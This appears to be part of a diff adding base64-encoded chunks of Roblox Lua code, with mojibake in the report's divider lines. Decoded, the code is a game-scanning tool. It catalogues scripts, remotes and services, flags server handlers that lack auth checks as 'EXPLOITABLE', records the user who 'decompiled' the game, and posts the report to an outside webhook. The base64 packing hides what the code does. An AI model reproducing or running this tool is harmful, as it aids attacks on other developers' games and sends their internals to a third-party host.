+'IGZvciBpZCBpbiBzcmM6Z21hdGNoKCJyYnhhc3NldDovLyglZCspIikgZG8gbG9jYWwgbiA9IHRvbnVtYmVyKGlkKTsgaWYgbiB0aGVuIHIuYXNzZXRzW25d',
+'ID0gdHJ1ZSBlbmQgZW5kCiAgICBmb3IgaWQgaW4gc3JjOmdtYXRjaCgiW0dnXWFtZXBhc3NbSWldW0RkXSVzKj0lcyooJWQrKSIpIGRvIGxvY2FsIG4gPSB0',
+'b251bWJlcihpZCk7IGlmIG4gdGhlbiByLmdhbWVwYXNzW25dID0gdHJ1ZSBlbmQgZW5kCiAgICBmb3IgaWQgaW4gc3JjOmdtYXRjaCgiW0RkXWV2W1BwXXJv',
+'ZHVjdFtJaV1bRGRdJXMqPSVzKiglZCspIikgZG8gbG9jYWwgbiA9IHRvbnVtYmVyKGlkKTsgaWYgbiB0aGVuIHIuZGV2cHJvZFtuXSA9IHRydWUgZW5kIGVu',
+'ZAogICAgZm9yIGlkIGluIHNyYzpnbWF0Y2goIltCYl1hZGdlW0lpXVtEZF0lcyo9JXMqKCVkKykiKSBkbyBsb2NhbCBuID0gdG9udW1iZXIoaWQpOyBpZiBu',
+'IHRoZW4gci5iYWRnZVtuXSA9IHRydWUgZW5kIGVuZAogICAgZm9yIHMgaW4gc3JjOmdtYXRjaCgnW2dHXWFtZTpHZXRTZXJ2aWNlJSgiKFteIl0qKSIlKScp',
+'IGRvIHIuc2VydmljZXNbc10gPSB0cnVlIGVuZAogICAgaWYgc3JjOmZpbmQoIkZpcmVTZXJ2ZXIiKSB0aGVuIHIua2V5d29yZHNbIkZpcmVTZXJ2ZXIiXSA9',
+'IHRydWUgZW5kCiAgICBpZiBzcmM6ZmluZCgiSW52b2tlU2VydmVyIikgdGhlbiByLmtleXdvcmRzWyJJbnZva2VTZXJ2ZXIiXSA9IHRydWUgZW5kCiAgICBp',
+'ZiBzcmM6ZmluZCgiRGF0YVN0b3JlIikgdGhlbiByLmtleXdvcmRzWyJEYXRhU3RvcmUiXSA9IHRydWUgZW5kCiAgICBpZiBzcmM6ZmluZCgiTWVzc2FnaW5n',
+'U2VydmljZSIpIHRoZW4gci5saWJyYXJpZXNbIk1lc3NhZ2luZyJdID0gdHJ1ZSBlbmQKICAgIGlmIHNyYzpmaW5kKCJNYXJrZXRwbGFjZVNlcnZpY2UiKSB0',
+'aGVuIHIubGlicmFyaWVzWyJNYXJrZXRwbGFjZSJdID0gdHJ1ZSBlbmQKICAgIGlmIHNyYzpmaW5kKCJNZW1vcnlTdG9yZVNlcnZpY2UiKSB0aGVuIHIubGli',
+'cmFyaWVzWyJNZW1vcnlTdG9yZSJdID0gdHJ1ZSBlbmQKICAgIGlmIHNyYzpmaW5kKCJUZWxlcG9ydFNlcnZpY2UiKSB0aGVuIHIubGlicmFyaWVzWyJUZWxl',
+'cG9ydCJdID0gdHJ1ZSBlbmQKICAgIGlmIHNyYzpmaW5kKCJHcm91cFNlcnZpY2UiKSB0aGVuIHIubGlicmFyaWVzWyJHcm91cCJdID0gdHJ1ZSBlbmQKICAg',
+'IGlmIHNyYzpmaW5kKCJGcmllbmRTZXJ2aWNlIikgdGhlbiByLmxpYnJhcmllc1siRnJpZW5kIl0gPSB0cnVlIGVuZAogICAgaWYgc3JjOmZpbmQoIlRleHRD',
+'aGF0U2VydmljZSIpIG9yIHNyYzpmaW5kKCJDaGF0U2VydmljZSIpIHRoZW4gci5saWJyYXJpZXNbIkNoYXQiXSA9IHRydWUgZW5kCiAgICBpZiBzcmM6Zmlu',
+'ZCgiVHdlZW5TZXJ2aWNlIikgdGhlbiByLmxpYnJhcmllc1siVHdlZW4iXSA9IHRydWUgZW5kCiAgICBpZiBzcmM6ZmluZCgiUnVuU2VydmljZSIpIHRoZW4g',
+'ci5saWJyYXJpZXNbIlJ1blNlcnZpY2UiXSA9IHRydWUgZW5kCiAgICBpZiBzcmM6ZmluZCgiUmVwbGljYXRlZFN0b3JhZ2UiKSBhbmQgbm90IHNyYzpmaW5k',
+'KCJHZXRTZXJ2aWNlIikgdGhlbiByLmxpYnJhcmllc1siUmVwbGljYXRlZFN0b3JhZ2UiXSA9IHRydWUgZW5kCiAgICBpZiBzcmM6ZmluZCgiU2VydmVyU2Ny',
+'aXB0U2VydmljZSIpIHRoZW4gci5saWJyYXJpZXNbIlNlcnZlclNjcmlwdFNlcnZpY2UiXSA9IHRydWUgZW5kCiAgICBpZiBzcmM6ZmluZCgiU3RhcnRlclBs',
+'YXllclNjcmlwdHMiKSB0aGVuIHIubGlicmFyaWVzWyJTdGFydGVyUGxheWVyIl0gPSB0cnVlIGVuZAogICAgaWYgI3NyYyA8IDEwIHRoZW4gci50YWdzWyJF',
+'TVBUWV9TQ1JJUFQiXSA9IHRydWUgZW5kCiAgICBpZiBzcmM6ZmluZCgid2FpdCUoOTk5OTk5Iikgb3Igc3JjOmZpbmQoIndhaXQoOTk5OTk5IikgdGhlbiBy',
+'LnRhZ3NbIklORl9XQUlUIl0gPSB0cnVlIGVuZAogICAgci5yZW1vdGVzID0gZXh0cmFjdFJlbW90ZUNhbGxzKHNyYykKICAgIHIucmVxdWlyZXMgPSBleHRy',
+'YWN0UmVxdWlyZXMoc3JjKQogICAgci50YWdzID0gZXh0cmFjdFRhZ3Moc3JjKQogICAgcmV0dXJuIHIKZW5kCgpsb2NhbCBmdW5jdGlvbiBzZW5kVG9XZWJo',
+'b29rKHJlcG9ydCkKICAgIGlmIG5vdCBXRUJIT09LX1NFQ1JFVCBvciAjV0VCSE9PS19TRUNSRVQgPT0gMCB0aGVuIHJldHVybiBmYWxzZSBlbmQKICAgIGxv',
+'Y2FsIG9rSiwganNvbiA9IHBjYWxsKEh0dHBTZXJ2aWNlLkpTT05FbmNvZGUsIEh0dHBTZXJ2aWNlLCB7IGNvbnRlbnQgPSByZXBvcnQgfSkKICAgIGlmIG5v',
+'dCBva0ogdGhlbiByZXR1cm4gZmFsc2UgZW5kCiAgICBsb2NhbCBvaywgciA9IHBjYWxsKEh0dHBTZXJ2aWNlLlBvc3RBc3luYywgSHR0cFNlcnZpY2UsIFdF',
+'QkhPT0tfU0VDUkVULCBqc29uLCAiYXBwbGljYXRpb24vanNvbiIpCiAgICByZXR1cm4gb2ssIHIKZW5kCgpsb2NhbCBmdW5jdGlvbiBidWlsZFJlcG9ydChy',
+'KQogICAgbG9jYWwgcCA9IHsKICAgICAgICAiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09XG4i',
+'LAogICAgICAgICIgICAgICAgICAgICAgICBHQU1FIFNDQU4gUkVQT1JUIHYzLjJcbiIsCiAgICAgICAgIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09',
+'PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxuIiwKICAgICAgICAiR2FtZSBOYW1lICAgOiAiIC4uIHIuZ2FtZU5hbWUgLi4gIlxuIiwKICAgICAg',
+'ICAiUGxhY2UgSUQgICAgOiAiIC4uIHRvc3RyaW5nKGdhbWUuUGxhY2VJZCkgLi4gIlxuIiwKICAgICAgICAiSm9iIElEICAgICAgOiAiIC4uIHRvc3RyaW5n',
+'KGdhbWUuSm9iSWQpIC4uICJcbiIsCiAgICAgICAgIkRhdGUvVGltZSAgIDogIiAuLiBvcy5kYXRlKCIlWS0lbS0lZCAlSDolTTolUyIpIC4uICJcbiIsCiAg',
+'ICAgICAgIlNlcnZlciBBZ2UgIDogIiAuLiBzdHJpbmcuZm9ybWF0KCIlLjFmIiwgd29ya3NwYWNlLkRpc3RyaWJ1dGVkR2FtZVRpbWUpIC4uICJzXG4iLAog',
+'ICAgICAgICJQbGF5ZXJzICAgICA6ICIgLi4gI1BsYXllcnM6R2V0UGxheWVycygpIC4uICIgLyAiIC4uIHRvc3RyaW5nKFBsYXllcnMuTWF4UGxheWVycykg',
+'Li4gIlxuIiwKICAgICAgICAiRGVjb21waWxlZCBCeTogIiAuLiAoTFAgYW5kIExQLk5hbWUgb3IgIlVua25vd24iKSAuLiAiICgiIC4uIChMUCBhbmQgTFAu',
+'RGlzcGxheU5hbWUgb3IgIlVua25vd24iKSAuLiAiKVxuIiwKICAgICAgICAiVXNlciBJRCAgICAgOiAiIC4uIChMUCBhbmQgdG9zdHJpbmcoTFAuVXNlcklk',
+'KSBvciAiVW5rbm93biIpIC4uICJcbiIsCiAgICAgICAgIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t',
+'LS0tLVxuIiwKICAgICAgICAiU1RBVElTVElDUzpcbiIsCiAgICAgICAgIiAgVG90YWwgSW5zdGFuY2VzIDogIiAuLiByLnRvdGFsIC4uICJcbiIsCiAgICAg',
+'ICAgIiAgUGFydC9NZXNoL1VuaW9uIDogIiAuLiByLnBhcnRzIC4uICJcbiIsCiAgICAgICAgIiAgTW9kZWwgICAgICAgICAgIDogIiAuLiByLm1vZGVscyAu',
+'LiAiXG4iLAogICAgICAgICIgIEZvbGRlciAgICAgICAgICA6ICIgLi4gci5mb2xkZXJzIC4uICJcbiIsCiAgICAgICAgIiAgU2NyaXB0ICAgICAgICAgIDog',
+'IiAuLiAjci5zY3JpcHRzIC4uICJcbiIsCiAgICAgICAgIiAgUmVtb3RlICAgICAgICAgIDogIiAuLiAjci5yZW1vdGVzIC4uICJcbiIsCiAgICAgICAgIiAg',
+'VmFsdWUgICAgICAgICAgIDogIiAuLiAjci52YWx1ZXMgLi4gIlxuIiwKICAgICAgICAiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09',
+'PT09PT09PT09PT09PT09PT09PT09XG5cbiIsCiAgICB9CgogICAgcFsjcCsxXSA9ICLDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoFcbiIKICAgIHBbI3ArMV0gPSAiIFNDUklQVCBQQVRIUyAgKCIgLi4gI3Iuc2NyaXB0cyAuLiAiKVxuIgogICAgcFsjcCsx',
+'XSA9ICLDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoFcbiIKICAgIGlmICNyLnNjcmlwdHMgPT0g',
+'MCB0aGVuIHBbI3ArMV0gPSAiICAobm9uZSlcbiIgZWxzZQogICAgICAgIGxvY2FsIGJ5U3ZjID0ge307IGxvY2FsIHN2Y09yZGVyID0ge30KICAgICAgICBm',
+'b3IgXywgdiBpbiBpcGFpcnMoci5zY3JpcHRzKSBkbwogICAgICAgICAgICBsb2NhbCBzdmMgPSB2LnBhdGg6bWF0Y2goIl5nYW1lJS4oW14lLl0rKSIpIG9y',
+'ICJVbmtub3duIgogICAgICAgICAgICBpZiBub3QgYnlTdmNbc3ZjXSB0aGVuIGJ5U3ZjW3N2Y10gPSB7fTsgc3ZjT3JkZXJbI3N2Y09yZGVyKzFdID0gc3Zj',
+'IGVuZAogICAgICAgICAgICBieVN2Y1tzdmNdWyNieVN2Y1tzdmNdKzFdID0gdgogICAgICAgIGVuZAogICAgICAgIGZvciBfLCBzdmMgaW4gaXBhaXJzKHN2',
+'Y09yZGVyKSBkbwogICAgICAgICAgICBsb2NhbCBsaXN0ID0gYnlTdmNbc3ZjXQogICAgICAgICAgICBwWyNwKzFdID0gIlxuICAtLSAiIC4uIHN2YyAuLiAi',
+'ICgiIC4uICNsaXN0IC4uICIgc2NyaXB0cylcbiIKICAgICAgICAgICAgZm9yIGksIHYgaW4gaXBhaXJzKGxpc3QpIGRvCiAgICAgICAgICAgICAgICBsb2Nh',
+'bCBwcmVmaXggPSBpID09ICNsaXN0IGFuZCAiICArLS0gIiBvciAiICB8LS0gIgogICAgICAgICAgICAgICAgcFsjcCsxXSA9IHN0cmluZy5mb3JtYXQoIiAg',
+'JXNbJXNdICVzICAodmlhOiAlcylcbiIsIHByZWZpeCwgdi50LCB2LnBhdGgsIHYubWV0aG9kKQogICAgICAgICAgICAgICAgaWYgdi50YWdzIGFuZCAjdi50',
+'YWdzID4gMCB0aGVuIHBbI3ArMV0gPSAiICAiIC4uIHN0cmluZy5yZXAoIiAiLCAjcHJlZml4KSAuLiAiVGFnczogIiAuLiB0YWJsZS5jb25jYXQodi50YWdz',
+'LCAiLCAiKSAuLiAiXG4iIGVuZAogICAgICAgICAgICAgICAgaWYgdi5yZW1vdGVDYWxscyBhbmQgI3YucmVtb3RlQ2FsbHMgPiAwIHRoZW4KICAgICAgICAg',
+'ICAgICAgICAgICBmb3IgXywgcmMgaW4gaXBhaXJzKHYucmVtb3RlQ2FsbHMpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIHBbI3ArMV0gPSAiICAiIC4u',
+'IHN0cmluZy5yZXAoIiAiLCAjcHJlZml4KSAuLiAiICAtPiAiIC4uIHJjLnR5cGUgLi4gIjogIiAuLiByYy5yZW1vdGUgLi4gIigiIC4uIHJjLmFyZ3MgLi4g',
+'IiBhcmdzKVxuIgogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5k',
+'CiAgICBwWyNwKzFdID0gIlxuIgoKICAgIHBbI3ArMV0gPSAiw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBXG4iCiAgICBwWyNwKzFdID0gIiBSRU1PVEUgJiBCSU5EQUJMRSAgKCIgLi4gI3IucmVtb3RlcyAuLiAiKVxuIgogICAgcFsjcCsxXSA9ICLDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoFcbiIKICAgIGlmICNyLnJlbW90ZXMgPT0gMCB0aGVuIHBb',
+'I3ArMV0gPSAiICAobm9uZSlcbiIgZWxzZQogICAgICAgICAgICBmb3IgcmksIHYgaW4gaXBhaXJzKHIucmVtb3RlcykgZG8KICAgICAgICAgICAgICAgIHBb',
+'I3ArMV0gPSAiICA+ICIgLi4gdG9zdHJpbmcodikgLi4gIlxuIgogICAgICAgICAgICAgICAgaWYgbG93RGV2aWNlTW9kZSBhbmQgcmkgJSA1MCA9PSAwIHRo',
+'ZW4gdGFzay53YWl0KCkgZW5kCiAgICAgICAgICAgIGVuZAogICAgZW5kCiAgICBwWyNwKzFdID0gIlxuIgoKICAgIHBbI3ArMV0gPSAiw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBXG4iCiAgICBwWyNwKzFdID0gIiBDUk9TUy1SRUZFUkVOQ0U6IEZJUkVT',
+'RVJWRVIgLT4gSEFORExFUiArIEFVVEhcbiIKICAgIHBbI3ArMV0gPSAiw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBXG4iCiAgICBsb2NhbCB4ckNvdW50ID0gMAogICAgZm9yIF8sIHYgaW4gaXBhaXJzKHIuc2NyaXB0cykgZG8KICAgICAgICBpZiB2LnJl',
+'bW90ZUNhbGxzIHRoZW4KICAgICAgICAgICAgZm9yIF8sIHJjIGluIGlwYWlycyh2LnJlbW90ZUNhbGxzKSBkbwogICAgICAgICAgICAgICAgaWYgcmMuaGFu',
+'ZGxlcnMgdGhlbgogICAgICAgICAgICAgICAgICAgIHhyQ291bnQgPSB4ckNvdW50ICsgMQogICAgICAgICAgICAgICAgICAgIGxvY2FsIGF1dGhUYWcgPSBy',
+'Yy5oYXNBdXRoIGFuZCAiIFtBVVRIOiBZRVNdIiBvciAiIFtBVVRIOiBOTyAtIEVYUExPSVRBQkxFXSIKICAgICAgICAgICAgICAgICAgICBwWyNwKzFdID0g',
+'c3RyaW5nLmZvcm1hdCgiICAlcyAtPiAlZCBoYW5kbGVyKHMpIHwgQXV0aFNjb3JlPSVkJXNcbiIsIHJjLnJlbW90ZSwgI3JjLmhhbmRsZXJzLCByYy5tYXhB',
+'dXRoIG9yIDAsIGF1dGhUYWcpCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIGggaW4gaXBhaXJzKHJjLmhhbmRsZXJzKSBkbwogICAgICAgICAgICAgICAg',
+'ICAgICAgICBsb2NhbCBjaGVja3MgPSAiIgogICAgICAgICAgICAgICAgICAgICAgICBpZiBoLmF1dGggYW5kICNoLmF1dGguY2hlY2tzID4gMCB0aGVuIGNo',
+'ZWNrcyA9ICIgeyIgLi4gdGFibGUuY29uY2F0KGguYXV0aC5jaGVja3MsICIsIikgLi4gIn0iIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBwWyNwKzFd',
+'ID0gc3RyaW5nLmZvcm1hdCgiICAgIEhhbmRsZXI6ICVzICglcykgc2NvcmU9JWQlc1xuIiwgaC5zY3JpcHRQYXRoLCBoLmhhbmRsZXJUeXBlLCBoLmF1dGgu',
+'c2NvcmUsIGNoZWNrcykKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAg',
+'IGVuZAogICAgaWYgeHJDb3VudCA9PSAwIHRoZW4gcFsjcCsxXSA9ICIgIChObyByZW1vdGUtdG8taGFuZGxlciBtYXRjaGVzIGZvdW5kKVxuIiBlbmQKICAg',
+'IHBbI3ArMV0gPSAiXG4iCgogICAgcFsjcCsxXSA9ICLDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woFcbiIKICAgIHBbI3ArMV0gPSAiIEZJUkVTRVJWRVIgLyBJTlZPS0VTRVJWRVIgQ0FMTFNcbiIKICAgIHBbI3ArMV0gPSAiw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBXG4iCiAgICBsb2NhbCByY0NvdW50ID0gMAogICAgZm9yIF8sIHYgaW4gaXBhaXJz',
+'KHIuc2NyaXB0cykgZG8gaWYgdi5yZW1vdGVDYWxscyB0aGVuIHJjQ291bnQgPSByY0NvdW50ICsgI3YucmVtb3RlQ2FsbHMgZW5kIGVuZAogICAgaWYgcmND',
+'b3VudCA9PSAwIHRoZW4gcFsjcCsxXSA9ICIgIChub25lKVxuIiBlbHNlCiAgICAgICAgbG9jYWwgYnlSZW1vdGUgPSB7fQogICAgICAgIGZvciBfLCB2IGlu',
+'IGlwYWlycyhyLnNjcmlwdHMpIGRvCiAgICAgICAgICAgIGlmIHYucmVtb3RlQ2FsbHMgdGhlbgogICAgICAgICAgICAgICAgZm9yIF8sIHJjIGluIGlwYWly',
+'cyh2LnJlbW90ZUNhbGxzKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBieVJlbW90ZVtyYy5yZW1vdGVdIHRoZW4gYnlSZW1vdGVbcmMucmVtb3Rl',
+'XSA9IHt9IGVuZAogICAgICAgICAgICAgICAgICAgIGJ5UmVtb3RlW3JjLnJlbW90ZV1bI2J5UmVtb3RlW3JjLnJlbW90ZV0rMV0gPSByYwogICAgICAgICAg',
+'ICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIGxvY2FsIHNvcnRlZCA9IHt9CiAgICAgICAgZm9yIGsgaW4gcGFpcnMoYnlS',
+'ZW1vdGUpIGRvIHNvcnRlZFsjc29ydGVkKzFdID0gayBlbmQKICAgICAgICB0YWJsZS5zb3J0KHNvcnRlZCkKICAgICAgICBmb3IgXywgcm0gaW4gaXBhaXJz',
+'KHNvcnRlZCkgZG8KICAgICAgICAgICAgbG9jYWwgY2FsbHMgPSBieVJlbW90ZVtybV0KICAgICAgICAgICAgcFsjcCsxXSA9IHN0cmluZy5mb3JtYXQoIiAg',
+'JXMgICglZCBjYWxscylcbiIsIHJtLCAjY2FsbHMpCiAgICAgICAgICAgIGxvY2FsIHNlZW4gPSB7fQogICAgICAgICAgICBmb3IgXywgcmMgaW4gaXBhaXJz',
+'KGNhbGxzKSBkbwogICAgICAgICAgICAgICAgbG9jYWwga2V5ID0gcmMudHlwZSAuLiAifCIgLi4gcmMuYXJncwogICAgICAgICAgICAgICAgaWYgbm90IHNl',
+'ZW5ba2V5XSB0aGVuCiAgICAgICAgICAgICAgICAgICAgc2VlbltrZXldID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgIHBbI3ArMV0gPSBzdHJpbmcuZm9y',
+'bWF0KCIgICAgJXMoJXMpICBhcmdzPSVkXG4iLCByYy50eXBlLCByYy5hcmdzU3RyLCByYy5hcmdzKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAg',
+'IGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICBwWyNwKzFdID0gIlxuIgoKICAgIGxvY2FsIGFsbFRhZ3MgPSB7fQogICAgZm9yIF8sIHYgaW4gaXBhaXJz',
+'KHIuc2NyaXB0cykgZG8gZm9yIHRhZyBpbiBwYWlycyh2LnRhZ3Mgb3Ige30pIGRvIGFsbFRhZ3NbdGFnXSA9IHRydWUgZW5kIGVuZAogICAgbG9jYWwgdGFn',
+'TGlzdCA9IHt9OyBmb3IgayBpbiBwYWlycyhhbGxUYWdzKSBkbyB0YWdMaXN0WyN0YWdMaXN0KzFdID0gayBlbmQ7IHRhYmxlLnNvcnQodGFnTGlzdCkKICAg',
+'IHBbI3ArMV0gPSAiw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
